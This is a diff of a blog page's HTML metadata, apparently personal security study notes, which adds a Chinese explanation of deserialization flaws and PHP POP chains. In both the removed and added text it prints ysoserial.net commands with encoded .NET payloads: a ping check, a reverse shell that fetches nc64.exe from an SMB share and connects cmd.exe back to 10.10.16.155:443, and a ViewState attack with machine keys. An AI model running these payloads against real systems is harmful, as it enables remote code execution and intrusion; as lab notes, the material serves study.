@@ -6,15 +6,15 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Enil ">
-<meta name="description" content="Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
+<meta name="description" content="原理 序列化是把内存里的对象转成可储存、可传输的字节流或字符串；反序列化时反过来，根据这船数据把对象重建出来。这本身是个正常的功能，用于跨进程、跨网络传递对象状态。
+反序列化不是被动地读数据，而是主动地重建对象。在重建地过程中，程序会自动实例化数据里指定地类、填充它的属性，而且很多语言会在这个过程里自动调用一些特殊方法（魔术方法/回调），比如 PHP 地 __wakeup、destruct，Java 的 readObject。
+如果攻击者能控制被反序列化的数据，他就控制了哪个类被实例化、属性时什么值。于是他可以挑选程序里已有的、危险的类，拼装处一条从魔术方法触发、一步步调用到危险操作（如执行命令、写文件）的调用链，这就是 gadget chain（利用链/POP 链）。攻击者没有注入新代码，而是把目标程序里已经存在的代码片段当积木重新编排，最后拼处 RCE。
+PHP 反序列化 入口与魔术方法 入口是 unserialize() 处理了用户可控数据。触发链靠魔术方法，按什么时候被调用分为：
+__wakeup()：反序列化时自动调用 __destruct()：对象被销毁时调用（脚本结束时必触发，是常用的链起点） __toString()：对象当字符串使用 __get()、__set()、__call()：访问不存在的属性/方法时 POP 链（面向属性编程） 单个魔术方法往往不能达成目的，以某个魔术方法为起点，精心构造的对象属性，让它去调用另一个对象方法，层层传递，最终达到一个能执行命令或写文件的危险终点。比如 __destruct 里调用了 $this -&gt; obj -&gt; close()，而把 obj 控制成另一个 close 里有危险操作的类。
+序列化格式可篡改 PHP 序列化是明文可读的，O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;...}。O 是对象、4 是类名长度、2 是属性个数。攻击者可以直接修改属性值、类型、甚至属性个数。
+Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
 (base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;ping -n 10 10.10.16.155&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0= ysoserial.net 专门用于生成 .NET 序列化漏洞利用有效载荷工具。
 (base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 -c：表示 command，指定执行的系统命令
-START /B：启动新进程，在 Windows 上后台运行，不打开新窗口。这里是执行一个后台任务
--o：指定输出的格式
--g：表示使用的 gadget，它们在反序列化过程中可以被利用来执行任意代码。ObjectDataProvider 是此处指定的 gadget 类型，是 WPF 框架中的一个类，常用于执行命令注入。
--f：指定序列化框架
-ViewState 反序列化攻击
-(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;ping -n 5 10.10.16.58&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/portfolio&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D 在 ysoseria 中 -g 参数可以使用 TypeConfuseDelegate 、WindowsIdentity 、TextFormattingRunProperties 这三个 gadget，这些都可以在 ViewState 反序列化攻击中使用。
 " />
 <meta name="keywords" content=", Hack" />
 <meta name="robots" content="noodp" />
@@ -49,31 +49,31 @@ ViewState 反序列化攻击
 
 
   <meta itemprop="name" content="反序列化">
-  <meta itemprop="description" content="Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
+  <meta itemprop="description" content="原理 序列化是把内存里的对象转成可储存、可传输的字节流或字符串；反序列化时反过来，根据这船数据把对象重建出来。这本身是个正常的功能，用于跨进程、跨网络传递对象状态。
+反序列化不是被动地读数据，而是主动地重建对象。在重建地过程中，程序会自动实例化数据里指定地类、填充它的属性，而且很多语言会在这个过程里自动调用一些特殊方法（魔术方法/回调），比如 PHP 地 __wakeup、destruct，Java 的 readObject。
+如果攻击者能控制被反序列化的数据，他就控制了哪个类被实例化、属性时什么值。于是他可以挑选程序里已有的、危险的类，拼装处一条从魔术方法触发、一步步调用到危险操作（如执行命令、写文件）的调用链，这就是 gadget chain（利用链/POP 链）。攻击者没有注入新代码，而是把目标程序里已经存在的代码片段当积木重新编排，最后拼处 RCE。
+PHP 反序列化 入口与魔术方法 入口是 unserialize() 处理了用户可控数据。触发链靠魔术方法，按什么时候被调用分为：
+__wakeup()：反序列化时自动调用 __destruct()：对象被销毁时调用（脚本结束时必触发，是常用的链起点） __toString()：对象当字符串使用 __get()、__set()、__call()：访问不存在的属性/方法时 POP 链（面向属性编程） 单个魔术方法往往不能达成目的，以某个魔术方法为起点，精心构造的对象属性，让它去调用另一个对象方法，层层传递，最终达到一个能执行命令或写文件的危险终点。比如 __destruct 里调用了 $this -&gt; obj -&gt; close()，而把 obj 控制成另一个 close 里有危险操作的类。
+序列化格式可篡改 PHP 序列化是明文可读的，O:4:&#34;User&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;...}。O 是对象、4 是类名长度、2 是属性个数。攻击者可以直接修改属性值、类型、甚至属性个数。
+Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
 (base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;ping -n 10 10.10.16.155&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0= ysoserial.net 专门用于生成 .NET 序列化漏洞利用有效载荷工具。
-(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 -c：表示 command，指定执行的系统命令
-START /B：启动新进程，在 Windows 上后台运行，不打开新窗口。这里是执行一个后台任务
--o：指定输出的格式
--g：表示使用的 gadget，它们在反序列化过程中可以被利用来执行任意代码。ObjectDataProvider 是此处指定的 gadget 类型，是 WPF 框架中的一个类，常用于执行命令注入。
--f：指定序列化框架
-ViewState 反序列化攻击
-(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;ping -n 5 10.10.16.58&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/portfolio&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D 在 ysoseria 中 -g 参数可以使用 TypeConfuseDelegate 、WindowsIdentity 、TextFormattingRunProperties 这三个 gadget，这些都可以在 ViewState 反序列化攻击中使用。">
+(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 -c：表示 command，指定执行的系统命令">
   <meta itemprop="datePublished" content="2026-03-02T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-02T14:00:00+08:00">
-  <meta itemprop="wordCount" content="96">
+  <meta itemprop="wordCount" content="139">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="反序列化">
-  <meta name="twitter:description" content="Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
+  <meta name="twitter:description" content="原理 序列化是把内存里的对象转成可储存、可传输的字节流或字符串；反序列化时反过来，根据这船数据把对象重建出来。这本身是个正常的功能，用于跨进程、跨网络传递对象状态。
+反序列化不是被动地读数据，而是主动地重建对象。在重建地过程中，程序会自动实例化数据里指定地类、填充它的属性，而且很多语言会在这个过程里自动调用一些特殊方法（魔术方法/回调），比如 PHP 地 __wakeup、destruct，Java 的 readObject。
+如果攻击者能控制被反序列化的数据，他就控制了哪个类被实例化、属性时什么值。于是他可以挑选程序里已有的、危险的类，拼装处一条从魔术方法触发、一步步调用到危险操作（如执行命令、写文件）的调用链，这就是 gadget chain（利用链/POP 链）。攻击者没有注入新代码，而是把目标程序里已经存在的代码片段当积木重新编排，最后拼处 RCE。
+PHP 反序列化 入口与魔术方法 入口是 unserialize() 处理了用户可控数据。触发链靠魔术方法，按什么时候被调用分为：
+__wakeup()：反序列化时自动调用 __destruct()：对象被销毁时调用（脚本结束时必触发，是常用的链起点） __toString()：对象当字符串使用 __get()、__set()、__call()：访问不存在的属性/方法时 POP 链（面向属性编程） 单个魔术方法往往不能达成目的，以某个魔术方法为起点，精心构造的对象属性，让它去调用另一个对象方法，层层传递，最终达到一个能执行命令或写文件的危险终点。比如 __destruct 里调用了 $this -&gt; obj -&gt; close()，而把 obj 控制成另一个 close 里有危险操作的类。
+序列化格式可篡改 PHP 序列化是明文可读的，O:4:&#34;User&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;...}。O 是对象、4 是类名长度、2 是属性个数。攻击者可以直接修改属性值、类型、甚至属性个数。
+Ysoserial 使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。
 (base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;ping -n 10 10.10.16.155&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0= ysoserial.net 专门用于生成 .NET 序列化漏洞利用有效载荷工具。
-(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 -c：表示 command，指定执行的系统命令
-START /B：启动新进程，在 Windows 上后台运行，不打开新窗口。这里是执行一个后台任务
--o：指定输出的格式
--g：表示使用的 gadget，它们在反序列化过程中可以被利用来执行任意代码。ObjectDataProvider 是此处指定的 gadget 类型，是 WPF 框架中的一个类，常用于执行命令注入。
--f：指定序列化框架
-ViewState 反序列化攻击
-(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;ping -n 5 10.10.16.58&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/portfolio&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D 在 ysoseria 中 -g 参数可以使用 TypeConfuseDelegate 、WindowsIdentity 、TextFormattingRunProperties 这三个 gadget，这些都可以在 ViewState 反序列化攻击中使用。">
